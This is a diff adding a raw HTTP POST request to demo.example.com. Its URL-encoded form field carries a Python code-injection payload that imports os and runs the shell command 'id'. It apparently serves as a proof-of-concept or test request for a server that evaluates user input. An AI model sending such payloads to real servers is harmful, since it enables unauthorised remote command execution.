@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 64
+Connection: close
+
+data=q%3D__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29
